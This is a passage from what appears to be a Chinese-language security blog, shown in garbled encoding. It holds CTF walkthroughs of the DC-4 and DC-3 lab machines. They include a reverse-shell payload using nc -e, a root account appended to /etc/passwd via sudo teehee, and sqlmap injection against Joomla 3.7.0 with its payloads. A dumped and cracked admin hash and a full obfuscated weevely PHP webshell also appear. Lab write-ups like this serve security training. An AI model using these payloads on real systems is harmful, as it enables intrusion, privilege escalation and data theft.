<p>charles@dc-4:<del>$ echo â€œMamor:x:0:0:::/bin/bashâ€ |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#x35;">&#77;&#97;&#109;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#x35;</a><br>The authenticity of host â€˜192.168.18.135 (192.168.18.135)â€™ canâ€™t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added â€˜192.168.18.135â€™ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#x61;&#x6d;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#53;">&#77;&#x61;&#x6d;&#x6f;&#114;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x38;&#46;&#49;&#x33;&#53;</a>â€˜s password:<br>Permission denied, please try again.<br><a href="mailto:&#x4d;&#x61;&#x6d;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;">&#x4d;&#x61;&#x6d;&#111;&#114;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;</a>â€˜s password: </p>
<p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
</blockquote>
<p>æ„é€ å¤±è´¥ï¼Œé‡æ–°æ„é€ ä¸€ä¸ª</p>
<blockquote>
<p><strong>charles@dc-4:~$ echo â€œMamor111::0:0:::/bin/bashâ€ |sudo teehee -a /etc/passwd</strong></p>
<p>â€¦â€¦â€¦â€¦.</p>
<p>Mamor111::0:0:::/bin/bash</p>
<p><strong>charles@dc-4:~$ echo â€œMamor111::0:0:::/bin/bashâ€ |sudo teehee -a /etc/passwd</strong></p>
<p>Mamor111::0:0:::/bin/bash<br><strong>charles@dc-4:~$ su Mamor111</strong></p>
<p><strong>root@dc-4:/home/charles# ls</strong><br><strong>root@dc-4:/home/charles# cd ../</strong><br><strong>root@dc-4:/home# ls</strong><br>charles  jim  sam<br><strong>root@dc-4:/home# cd ../</strong><br><strong>root@dc-4:/# ls</strong><br>bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz<br>boot  home        lib             mnt    root  srv   usr  vmlinuz.old<br>dev   initrd.img  lost+found      opt    run   sys   var<br><strong>root@dc-4:/# cd root</strong><br><strong>root@dc-4:/root# ls</strong><br>flag.txt<br><strong>root@dc-4:/root# cat flag.txt</strong></p>
<p>888       888          888 888      8888888b.                             888 888 888 888<br>888   o   888          888 888      888  â€œY88b                            888 888 888 888<br>888  d8b  888          888 888      888    888                            888 888 888 888<br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br>888d88888b888 d8P  Y8b 888 888      888    888 d88â€â€88b 888 â€œ88b d8P  Y8b 888 888 888 888<br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      â€œ   â€œ   â€œ   â€œ<br>888P     Y888  â€œY8888  888 888      8888888Pâ€   â€œY88Pâ€  888  888  â€œY8888  888 888 888 888 </p>
<p>Congratulations!!!</p>
<p>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.</p>
<p>If you enjoyed this CTF, send me a tweet via @DCAU7.<br>**root@dc-4:/root# **</p>
</blockquote>
<br>
<br>

<p>æ€»ç»“</p>
<ul>
<li>nmapæ‰«ç½‘æ®µï¼Œé¶æœºç«¯å£</li>
<li>dirsearchæ‰«ç›®å½•</li>
<li>burpsuiteçˆ†ç ´åå°</li>
<li>è¿›å…¥åå°å‘ç°èƒ½æ‰§è¡Œéƒ¨åˆ†å‘½ä»¤å¹¶æŠ“åŒ…ä¿®æ”¹å‘ç°èƒ½å‘½ä»¤æ‰§è¡Œ</li>
<li>åå¼¹shell<blockquote>
<p>åå¼¹shell<br>kali@kali2020:~$ nc -lvp 8888<br>burpæ”¹åŒ…<br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run<br>ä½¿ç”¨pythonå¾—åˆ°äº¤äº’å¼shell<br>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™</p>
</blockquote>
</li>
<li>cat /etc/passwd å‘ç°ä¸‰ä¸ªç”¨æˆ·ï¼Œå¹¶æŸ¥çœ‹ä¿¡æ¯</li>
<li>sshç”¨æˆ·çˆ†ç ´</li>
<li><strong>teeheeææƒ</strong><blockquote>
<p>teeheeå¯é€šè¿‡echo â€œxxxâ€|sudo teehee -a â€˜fileâ€™çš„æ–¹å¼å°†å†…å®¹å†™å…¥åˆ°ç”¨æˆ·æ— æ³•ç›´æ¥æ“ä½œçš„æ–‡ä»¶ä¸­</p>
</blockquote>
</li>
<li>åˆ›å»ºç®¡ç†å‘˜èº«ä»½å¹¶åˆ‡æ¢</li>
<li>å¾—åˆ°flag</li>
</ul>
<br>

<br>

<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
<p><a href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
<p><a href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>proxychain4é…ç½®â€”â€”è™šæ‹Ÿæœºæ— æ³•æ­£å¸¸èµ°ä»£ç†</title>
    <url>/posts/45d6c023/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DCchallenges3</title>
    <url>/posts/93e5b017/</url>
    <content><![CDATA[<ul>
<li>ç¯å¢ƒ</li>
</ul>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>é¶æœº 192.168.18.134</p>
</blockquote>
<p>nmapæ‰«æç½‘æ®µ</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:09 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00010s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.134<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:83:96:86 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00033s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.01 seconds</p>
</blockquote>
<p>æ‰«æé¶æœºå¼€æ”¾ç«¯å£</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.134 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:11 CST<br>Nmap scan report for 192.168.18.134<br>Host is up (0.0014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 00:0C:29:83:96:86 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds</p>
</blockquote>
<p>åªå¼€æ”¾äº†80ç«¯å£</p>
<p>dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.134:80</p>
<br>

<p>æ‰«åˆ°äº†ç®¡ç†å‘˜ç™»å½•é¡µé¢</p>
<p><a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a></p>
</blockquote>
<p>æ‰“å¼€ä¸»é¡µæœ‰è¯´æ˜</p>
<blockquote>
<p>Welcome to DC-3.</p>
<p>This time, there is only one flag, one entry point and no clues.</p>
<p>To get the flag, youâ€™ll obviously have to gain root privileges.</p>
<p>How you get to be root is up to you - and, obviously, the system.</p>
<p>Good luck - and I hope you enjoy this little challenge.  :-)</p>
</blockquote>
<p>è¿™æ¬¡åªæœ‰ä¸€ä¸ªflagç›¸åº”å¾—åˆ°flagå°±è¦å¾—åˆ°rootæƒé™</p>
<p>è®¿é—®administratoré¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯Joomlaæ­å»ºçš„å¹³å°</p>
<p>åœ¨ç½‘ä¸Šæœäº†ä¸‹å‘ç°æœ‰ä¸€æ¬¾JoomScanï¼Œå®‰è£…<code>sudo git clone https://github.com/rezasp/joomscan.git</code></p>
<blockquote>
<p>perl joomscan.pl -u 192.168.18.134  </p>
<p>[+] FireWall Detector<br>[++] Firewall not detected</p>
<p>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0</p>
<p>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable                                                     </p>
<p>[+] Checking Directory Listing<br>[++] directory has directory listing :<br><a href="http://192.168.18.134/administrator/components">http://192.168.18.134/administrator/components</a><br><a href="http://192.168.18.134/administrator/modules">http://192.168.18.134/administrator/modules</a><br><a href="http://192.168.18.134/administrator/templates">http://192.168.18.134/administrator/templates</a><br><a href="http://192.168.18.134/images/banners">http://192.168.18.134/images/banners</a>                                                          </p>
<p>[+] Checking apache info/status files<br>[++] Readable info/status files are not found                                                 </p>
<p>[+] admin finder<br>[++] Admin page : <a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a>                                        </p>
<p>[+] Checking robots.txt existing<br>[++] robots.txt is not found                                                                  </p>
<p>[+] Finding common backup files name<br>[++] Backup files are not found                                                               </p>
<p>[+] Finding common log files name<br>[++] error log is not found                                                                   </p>
<p>[+] Checking sensitive config.php.x file<br>[++] Readable config files are not found                                                      </p>
<p>Your Report : reports/192.168.18.134/                                 </p>
</blockquote>
<p>å‘ç°Joomalç‰ˆæœ¬ä¸º3.7.0</p>
<p>ç½‘ä¸Šæœç´¢ç›¸å…³æ¼æ´å‘ç°å­˜åœ¨SQLæ³¨å…¥</p>
<br>

<blockquote>
<p>kali@kali2020:~/Tools$ sudo searchsploit joomla 3.7.0</p>
<hr>
<p> Exploit Title                                              |  Path</p>
<hr>
<p>Joomla! 3.7.0 - â€˜com_fieldsâ€™ SQL Injection                  | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripti | php/webapps/43488.txt</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<p><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
<blockquote>
<p>#Exploit Title: Joomla 3.7.0 - Sql Injection</p>
<p>#Date: 05-19-2017</p>
<p>#Exploit Author: Mateus Lino</p>
<p>#Reference: <a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
<p>#Vendor Homepage: <a href="https://www.joomla.org/">https://www.joomla.org/</a></p>
<p>#Version: = 3.7.0</p>
<p>#Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</p>
<p>#CVE : - CVE-2017-8917</p>
<p>URL Vulnerable: <a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml%27">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</a></p>
<p>Using Sqlmap: </p>
<p>sqlmap -u â€œ<a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“level=5 â€“random-agent â€“dbs -p list[fullordering]</p>
<p>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</p>
<p>   Type: error-based<br>   Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</p>
<p>   Type: AND/OR time-based blind<br>   Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</p>
</blockquote>
<br>

<p>ç»™å‡ºäº†å­˜åœ¨sqlæ³¨å…¥çš„url</p>
<p><code>http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</code></p>
<p>sqlmapæ³¨å…¥å‘½ä»¤</p>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>å­˜åœ¨çš„sqlæ³¨å…¥ç±»å‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Type: boolean-based blind</span><br><span class="line">Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END) </span><br><span class="line">Type: error-based</span><br><span class="line">Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)  </span><br><span class="line">Type: AND/OR time-based blind</span><br><span class="line">Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</span><br></pre></td></tr></table></figure>

<p>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“random-agent â€“batch â€“dbs -p list[fullordering]</p>
<p>å¾—åˆ°æ•°æ®åº“</p>
<blockquote>
<p>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys</p>
</blockquote>
<p>æŸ¥è¡¨å</p>
<p>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“random-agent â€“batch -D joomladb â€“tables -p list[fullordering]</p>
<blockquote>
<p>Database: joomladb<br>[76 tables]<br>+â€”â€”â€”â€”â€”â€”â€”+<br>| #__assets           |<br>| #__associations     |<br>| #__banner_clients   |<br>| #__banner_tracks    |<br>| #__banners          |<br>| #__bsms_admin       |<br>| #__bsms_books       |<br>| #__bsms_comments    |<br>| #__bsms_locations   |<br>| #__bsms_mediafiles  |<br>| #__bsms_message_typ |<br>| #__bsms_podcast     |<br>| #__bsms_series      |<br>| #__bsms_servers     |<br>| #__bsms_studies     |<br>| #__bsms_studytopics |<br>| #__bsms_teachers    |<br>| #__bsms_templatecod |<br>| #__bsms_templates   |<br>| #__bsms_timeset     |<br>| #__bsms_topics      |<br>| #__bsms_update      |<br>| #__categories       |<br>| #__contact_details  |<br>| #__content_frontpag |<br>| #__content_rating   |<br>| #__content_types    |<br>| #__content          |<br>| #_<em>contentitem_tag</em> |<br>| #__core_log_searche |<br>| #__extensions       |<br>| #__fields_categorie |<br>| #__fields_groups    |<br>| #__fields_values    |<br>| #__fields           |<br>| #__finder_filters   |<br>| #__finder_links_ter |<br>| #__finder_links     |<br>| #_<em>finder_taxonomy</em> |<br>| #__finder_taxonomy  |<br>| #__finder_terms_com |<br>| #__finder_terms     |<br>| #__finder_tokens_ag |<br>| #__finder_tokens    |<br>| #__finder_types     |<br>| #__jbsbackup_timese |<br>| #__jbspodcast_times |<br>| #__languages        |<br>| #__menu_types       |<br>| #__menu             |<br>| #__messages_cfg     |<br>| #__messages         |<br>| #__modules_menu     |<br>| #__modules          |<br>| #__newsfeeds        |<br>| #__overrider        |<br>| #__postinstall_mess |<br>| #__redirect_links   |<br>| #__schemas          |<br>| #__session          |<br>| #__tags             |<br>| #__template_styles  |<br>| #__ucm_base         |<br>| #__ucm_content      |<br>| #__ucm_history      |<br>| #__update_sites_ext |<br>| #__update_sites     |<br>| #__updates          |<br>| #__user_keys        |<br>| #__user_notes       |<br>| #__user_profiles    |<br>| #__user_usergroup_m |<br>| #__usergroups       |<br>| #__users            |<br>| #__utf8_conversion  |<br>| #__viewlevels       |<br>+â€”â€”â€”â€”â€”â€”â€”+</p>
</blockquote>
<p>æŸ¥å­—æ®µ<br>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“random-agent -p list[fullordering] -D â€œjoomladbâ€ -T â€œ#__usersâ€ â€“columns</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+â€”â€”â€”-+â€”â€”â€”â€”-+<br>| Column   | Type        |<br>+â€”â€”â€”-+â€”â€”â€”â€”-+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+â€”â€”â€”-+â€”â€”â€”â€”-+</p>
</blockquote>
<br>

<p>sqlmap -u â€œ<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> â€“risk=3 â€“level=5 â€“random-agent -D joomladb -T â€œ#__usersâ€ -C â€œusername,passwordâ€ â€“dump  -p list[fullordering]</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+<br>| username | password                                                     |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+<br>| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+</p>
</blockquote>
<br>

<p>æŠŠå¯†ç å­˜å‚¨èµ·æ¥ä½¿ç”¨Johnçˆ†ç ´</p>
<br>

<blockquote>
<p><code>vim dc3password_hash.txt</code></p>
<p>kali@kali2020:<del>/Tools$ cat dc3password_hash.txt<br>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu<br>kali@kali2020:</del>/Tools$ sudo john dc3password_hash.txt -show<br>?:snoopy</p>
</blockquote>
<p>å¾—åˆ°å¯†ç ä¸ºsnoopy</p>
<p>å»ç™»å½•åå°(admin,snoopy),æˆåŠŸç™»å½•</p>
<p>å¯»æ‰¾å¯ä»¥ä¸Šä¼ shellçš„ä½ç½®</p>
<p>ä½¿ç”¨kaliä¸Šè‡ªå¸¦çš„weevelyï¼ˆä¸€æ¬¾webshellç®¡ç†å·¥å…·ï¼‰</p>
<blockquote>
<p>kali@kali2020:~$ weevely generate pass shell.php</p>
<p>Generated â€˜shell.phpâ€™ with password â€˜passâ€™ of 761 byte size.</p>
<p>kali@kali2020:~$ cat shell.php<br><?php
$Q='unction0/ x($t,$k){0/$0/c=strlen($k)0/;$0/l=strlen($0/t0/0/);$o="";f0/or($i=0;0/$i<$l;){for(0/$j0/0/';
$O='"0//$kh(.+)$0/kf/0/",@fi0/le_get_co0/0/ntents("php://0/i0/nput")0/,$m)==1) {0/@ob_st0/art();@e0/va';
$w='_e0/nd_cle0/an();$r=@base0/0/64_encode(@x(0/0/@gzc0/o0/m0/press($o),$k));pr0/int(0/"$p$kh$r$kf");}';
$o='$k="1a1dc0/91c";0/$k0/h="907320/5c0/69271";$k0/f="ddf0c940/4bc0/72";0/$p="Dw8BNaV0/0/He7JVExH0/0/0";f';
$Z=str_replace('iC','','criCeiCaiCteiC_funciCtiCion');
$A='=0;0/($j<$c&0/&0/$i0/<$l);$j0/++,$i++){$0/o.=$t{$i}^$k{$j};}}ret0/urn $0/o;}i0/f (@preg_0/match0/(';
$i='l0/(@gzun0/compress(0/@x(@0/base60/4_deco0/de($m[1])0/,$k)))0/;0/$o=@o0/b_get_conte0/nts();@0/o0/b';
$X=str_replace('0/','',$o.$Q.$A.$O.$i.$w);
$R=$Z('',$X);$R();
?></p>
</blockquote>
<p>å°†shell.phpä¸Šä¼ åè¿›è¡Œè¿æ¥</p>
<blockquote>
<p>kali@kali2020:~$ weevely <a href="http://192.168.18.134/templates/beez3/shell.php">http://192.168.18.134/templates/beez3/shell.php</a> pass</p>
<p>[+] weevely 4.0.1</p>
<p>[+] Target:     192.168.18.134<br>[+] Session:    /home/kali/.weevely/sessions/192.168.18.134/shell_1.session</p>
<p>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.</p>
<p>weevely&gt; shell<br>sh: 1: shell: not found<br>www-data@DC-3:/var/www/html/templates/beez3 $ whoami<br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3 $ </p>
<br>
</blockquote>
<p>æƒ³åŠæ³•ææƒ</p>
<p>æŸ¥çœ‹é¶æœºç‰ˆæœ¬ï¼Œå‘ç°ä¸ºubunutu16.04 å†…æ ¸ç‰ˆæœ¬ä¸º4.4.0-21</p>
<blockquote>
<p>www-data@DC-3:/var/www/html $ uname -a<br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br>www-data@DC-3:/var/www/html $  lsb_release -a<br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 16.04 LTS<br>Release:        16.04<br>Codename:       xenial</p>
</blockquote>
<p>å»æ¼æ´åº“æ‰¾ä¸‹</p>
<blockquote>
<p>kali@kali2020:~/Tools$ searchsploit -w ubuntu 16.04 4.4.0-21</p>
<hr>
<p> Exploit Title                                                                |  URL</p>
<hr>
<p>Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free          | <a href="https://www.exploit-db.com/exploits/43234">https://www.exploit-db.com/exploits/43234</a><br>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter â€˜target_offsetâ€™ Out-of-B | <a href="https://www.exploit-db.com/exploits/40049">https://www.exploit-db.com/exploits/40049</a><br>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - â€˜AF_PACKETâ€™ Race  | <a href="https://www.exploit-db.com/exploits/47170">https://www.exploit-db.com/exploits/47170</a><br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | <a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a><br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation        | <a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a><br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - â€˜netfilter target_offsetâ€™ Local  | <a href="https://www.exploit-db.com/exploits/44300">https://www.exploit-db.com/exploits/44300</a><br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege E | <a href="https://www.exploit-db.com/exploits/43418">https://www.exploit-db.com/exploits/43418</a><br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) | <a href="https://www.exploit-db.com/exploits/47169">https://www.exploit-db.com/exploits/47169</a><br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege E | <a href="https://www.exploit-db.com/exploits/41760">https://www.exploit-db.com/exploits/41760</a></p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<br>

<blockquote>
<p>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>â€“2021-05-01 23:52:54â€“  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)â€¦ 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443â€¦ connected.<br>HTTP request sent, awaiting responseâ€¦ 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>â€“2021-05-01 23:52:55â€“  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)â€¦ ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443â€¦ failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443â€¦ failed: Connection refused.<br>www-data@DC-3:/var/www $ ls<br>html<br>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a></p>
<p>â€“2021-05-01 23:53:39â€“  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)â€¦ 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443â€¦ connected.<br>HTTP request sent, awaiting responseâ€¦ No data received.<br>Retrying.</p>
<p>â€“2021-05-01 23:53:56â€“  (try: 2)  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Connecting to github.com (github.com)|13.250.177.223|:443â€¦ failed: Connection refused.<br>Resolving github.com (github.com)â€¦ 13.229.188.59<br>Connecting to github.com (github.com)|13.229.188.59|:443â€¦ connected.<br>HTTP request sent, awaiting responseâ€¦ 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>â€“2021-05-01 23:54:18â€“  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)â€¦ ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443â€¦ failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443â€¦ failed: Connection refused.</p>
</blockquote>
